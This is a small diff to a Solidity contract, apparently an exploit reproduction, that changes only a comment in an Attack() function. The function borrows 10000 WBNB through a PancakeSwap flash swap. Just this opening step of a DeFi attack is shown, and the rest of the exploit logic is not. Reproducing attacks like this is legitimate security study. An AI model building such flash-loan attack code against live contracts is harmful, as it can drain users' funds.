@@ -49,9 +49,8 @@ contract  test{
 
     function Attack()external {
 
-        // Brrow 10000 WBNB
-
-
+        // Trigger the FlashSwap, Brrow 10000 WBNB
+                
         IpancakePair(Pancake_Pair_Address).swap(0,10000*1e18,address(this),"0x00");
 
     }
